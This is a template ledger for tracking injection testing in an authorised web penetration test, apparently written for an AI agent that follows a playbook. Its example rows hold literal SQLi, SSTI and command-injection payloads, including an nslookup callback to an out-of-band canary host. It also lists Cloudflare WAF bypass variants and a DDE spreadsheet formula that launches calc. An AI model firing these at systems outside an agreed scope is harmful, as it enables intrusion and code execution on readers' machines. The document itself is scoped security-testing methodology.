# Coverage Ledger — <TARGET>

Copy to `targets/<target>/coverage.md`. Built in phase 2 per `playbook/00-surface-and-ledger.md` 2.5.
This file is the source of truth (`CLAUDE.md` 6.1). If it is wrong, the sweep is wrong.

## How to use

1. **No row is ever deleted.** A row you think is irrelevant becomes `tested-negative` with the payload you used.
2. **Negatives need payloads.** `tested-negative` requires the literal payload and the response. "Looked fine"
   is not a result — with no payload the state is `untested` (`CLAUDE.md` 6.2).
   Before writing `tested-negative`, run the pre-negative checklist in `playbook/04-false-negatives.md` F.9.
   Nine questions, one minute. It is the difference between a negative and an unexamined row.
3. **One row per (vector, sink type).** Not one row per vector. A `q` parameter tested for SQLi, SSTI, and
   command injection is three rows.
4. **Done means zero `untested`.** Report coverage as counts, never as "finished testing".
5. **A WAF block is `suspicious`, never negative** (`CLAUDE.md` 6.6). Go to
   `playbook/03-bypass-and-blind.md` and log every bypass attempt in `Notes` per 3.10.
6. **Blind sinks need a callback before they can go negative** (`CLAUDE.md` 6.8).
7. **Work `suspicious` rows before adding new surface.**
8. New endpoints, new roles, or a disclosure finding that hands you parameters → add rows, do not test ad hoc
   (`playbook/00-surface-and-ledger.md` 2.6).

## Header

```
target:        <apex domain / app name>
date started:  YYYY-MM-DD
last updated:  YYYY-MM-DD
scope file:    scope.md            (program scope, policy URL, forbidden techniques)
rate limit:    5 req/s, 1 concurrent job     (or lower, from scope.md)
stack guess:   <lang> / <framework> / <db> / <WAF or none>
confidence:    low | medium | high
signals:       <the fingerprint signals, per 00-surface-and-ledger.md 2.2>
OOB domain:    cXXXXXXXX.oast.pro           (interactsh, this session)
canary prefix: r<ID>-<vector>-<payload>     (scheme in 03-bypass-and-blind.md B.7)
```

Auth contexts in use. Every context is a separate pass over the same vectors.

| Ctx | Account / role | How the session is held | Notes |
|---|---|---|---|
| A0 | unauthenticated | none | |
| A1 | `test-user-1@example.com` / user | cookie `session=...` | operator's own test account |
| A2 | `test-admin-1@example.com` / admin | cookie `session=...` | only if the program provides it |
| A3 | tenant 2, user | cookie `session=...` | for cross-tenant render sites |

## Baseline

Recorded before any fuzzing (`playbook/00-surface-and-ledger.md` 2.4). Injection detection is diff
detection; without this you miss a 3-byte change.

| Endpoint | Method | Auth ctx | Status | Length | Timing (median) | Content hash | Error shape |
|---|---|---|---|---|---|---|---|
| `/api/search` | POST | A1 | 200 | 1843 | 120ms | `a91f3c2e` | `400 {"error":"invalid"}` len 31 |
| `/api/search` | POST | A0 | 401 | 42 | 25ms | `7bb01f90` | same |
| `/api/user/{id}` | GET | A1 | 200 | 964 | 88ms | `c4d7e110` | `404 {"error":"not found"}` len 33 |
| `/profile` | POST | A1 | 302 | 0 | 210ms | — | `422` + field-named HTML error |
| `/export?fmt=csv` | GET | A1 | 200 | 12044 | 640ms | varies | `400 text/plain` len 18 |

Timing is the median of 10 requests, not one sample (`playbook/03-bypass-and-blind.md` B.8).

## Main ledger

States, exactly these four:

| State | Meaning |
|---|---|
| `untested` | not probed, or probed with no recorded payload |
| `tested-negative` | payload recorded, response recorded, sink did not respond — and for a filtered row, the filter was bypassed first |
| `suspicious` | anomaly, WAF block, scanner hit not yet reproduced, or blind sink with no callback yet |
| `confirmed` | reproduced by hand, request and response saved in `evidence/` |

| ID | Endpoint | Method | Vector (type + name) | Auth ctx | Sink type | State | Payload used | Evidence ref | Notes |
|---|---|---|---|---|---|---|---|---|---|
| R0001 | `/api/search` | POST | json value `q` | A1 | SQLi | `confirmed` | `test' AND (SELECT SUBSTR(version(),1,1))='P'-- -` vs `='X'-- -` | `evidence/search-q-sqli-1.txt`, `-2.txt` | Boolean oracle, len 1843 vs 1791. Postgres. Schema only, one proof value from own row per 03 B.9. Finding `findings/search-q-sqli.md` |
| R0002 | `/api/search` | POST | json value `q` | A1 | SSTI | `tested-negative` | `{{7*7}}` `${7*7}` `#{7*7}` `<%= 7*7 %>` `{{7*'7'}}` | `evidence/search-q-ssti-1.txt` | All echoed literally, 200 / len 1856 / 118ms. No arithmetic evaluated, no engine error. Value reflected in JSON only |
| R0003 | `/api/search` | POST | json value `q` | A1 | cmd injection | `suspicious` | `;nslookup r0003-j-cmd.01.cXXXXXXXX.oast.pro` and 5 separator variants | `evidence/search-q-cmd-1.txt` | 403 / len 1284 / 40ms on every variant. `cf-ray` present, session cookie dropped → Cloudflare, edge block (03 B.2). Bypass log below in this row's expansion; not negative until filter is beaten (`CLAUDE.md` 6.6) |
| R0004 | `/api/user/{id}` | GET | path segment `{id}` | A1 | SQLi | `tested-negative` | `1 AND 1=1` / `1 AND 1=2`, `1'`, `1/0`, `1 AND SLEEP(3)` (1 probe) | `evidence/user-id-sqli-1.txt` | Identical 200 / len 964 / 88ms for true and false. `1'` → 404 not 500. Non-numeric input 404s before reaching any query. Route validates `^\d+$` (framework validation, not WAF — 03 B.2) |
| R0005 | `/profile` | POST | multipart `filename=` | A1 | SSTI (2nd order) | `suspicious` | `{{7*7}}-r0005-f-ssti.txt` | `evidence/profile-filename-1.txt` | Stored, accepted. Not yet rendered anywhere checked. See render-site table — CSV export and admin view still unchecked. Do not close until every render site is checked (`CLAUDE.md` 6.7) |
| R0006 | `/api/search` | POST | header `X-Forwarded-For` | A1 | SQLi | `untested` | — | — | Header vectors not started. sqlmap `--level 3` covers UA/Referer only; XFF needs a hand probe |
| R0007 | `/export` | GET | query `fmt` | A1 | path traversal | `untested` | — | — | Values seen: `csv`, `xlsx`, `pdf`. App allowlist suspected — see 03 B.4 for the only families that beat one |

Bypass attempts for `suspicious` rows are logged inside the row's `Notes` in the format from
`playbook/03-bypass-and-blind.md` B.10:

```
R0003 | json q | cmd
  waf(cloudflare) | plain        | ;nslookup <canary>            | 403/1284/40ms  | blocked
  waf(cloudflare) | double-url   | %253bnslookup+<canary>        | 403/1284/41ms  | blocked
  waf(cloudflare) | json-escape  | {"q":";nslookup <canary>"} | 200/1843/125ms | passed filter, no callback in 30min
  waf(cloudflare) | ct-mismatch  | json body declared as form    | 200/1843/121ms | passed filter, no callback in 30min
  not tried: hpp (no duplicate-param handling seen), origin IP (not in scope.md — asked operator)
  -> stays suspicious: filter bypassed, callback window still open
```

## Render sites — second-order tracking

`CLAUDE.md` 6.7: anything you submit may render somewhere else later. Second-order is the most missed class.
Plant a canary in every stored field, then check every row below. Re-check after each new write.

Canary form: `r<rowid>-<vector>-<payload>` plus a visible marker, e.g. `ZZ{{7*7}}ZZ-r0005`. Search render
sites for both the literal canary and the evaluated result (`ZZ49ZZ`).

| Canary | Input vector | Where checked | Date | Result |
|---|---|---|---|---|
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | HTML page that displays it | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | CSV export | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | XLSX export | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | PDF export | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | notification / transactional email | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | log viewer | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | admin view (ctx A2) | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | webhook payload | | |
| `ZZ{{7*7}}ZZ-r0005` | multipart `filename=` on `/profile` | mobile / other API representation | | |
| | profile display name | HTML page that displays it | | |
| | profile display name | CSV export | | |
| | profile display name | XLSX export | | |
| | profile display name | PDF export | | |
| | profile display name | notification / transactional email | | |
| | profile display name | log viewer | | |
| | profile display name | admin view (ctx A2) | | |
| | profile display name | webhook payload | | |
| | profile display name | mobile / other API representation | | |

Result values: `not rendered` / `rendered literal` / `rendered evaluated` / `rendered escaped` / `not checked`.
`not checked` on any row means the second-order sweep is not done.

Formula canary for CSV/XLSX export sinks (spreadsheet injection is an injection sink):

```
=1+1
+1+1
-1+1
@SUM(1+1)
=cmd|'/C calc'!A0
```

RISK: the last form executes on the reader's machine, not the target. Use `=1+1` for proof and report the
behaviour. Do not craft a payload that runs anything on whoever opens the export.

## Coverage summary

Recount before every operator update. Paste this block as-is.

```
coverage: <total> rows
  untested         <n>
  tested-negative  <n>
  suspicious       <n>
  confirmed        <n>
render sites: <checked>/<total> checked
blocked rows needing operator: <n>   (see notes.md, blocked section)
```

Count it, do not estimate:

```bash
cd /root/pentest/targets/TARGET
# only ledger rows (they start with "| R"), so the docs above are not counted
printf 'total            %s\n' "$(grep -c '^| R[0-9]' coverage.md)"
for s in untested tested-negative suspicious confirmed; do
  printf '%-16s %s\n' "$s" "$(grep '^| R[0-9]' coverage.md | grep -c "\`$s\`")"
done
```

Not done while `untested` is above zero (`CLAUDE.md` 6.1).
